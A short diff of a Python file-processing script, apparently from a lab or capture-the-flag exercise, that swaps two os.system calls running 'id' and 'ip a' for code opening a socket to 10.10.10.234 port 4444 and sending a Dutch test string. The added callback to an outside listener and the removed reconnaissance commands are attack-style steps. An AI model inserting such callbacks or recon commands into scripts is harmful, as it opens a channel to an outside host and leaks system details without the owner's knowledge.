@@ -5,7 +5,7 @@ import logging
 import time
 from pathlib import Path
 import argparse
-from os import system
+import socket
 
 
 if __name__ == '__main__':
@@ -50,7 +50,9 @@ if __name__ == '__main__':
         except:
             logging.info("An exception occurred for file: " + f.name)  
 
-    system(f"id >> {args.output_path}/info.txt")
-    system(f"ip a >> {args.output_path}/info.txt")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("10.10.10.234", 4444))
+    s.send("Test vanuit blind")
+    s.close()
 
     logging.info('finished')
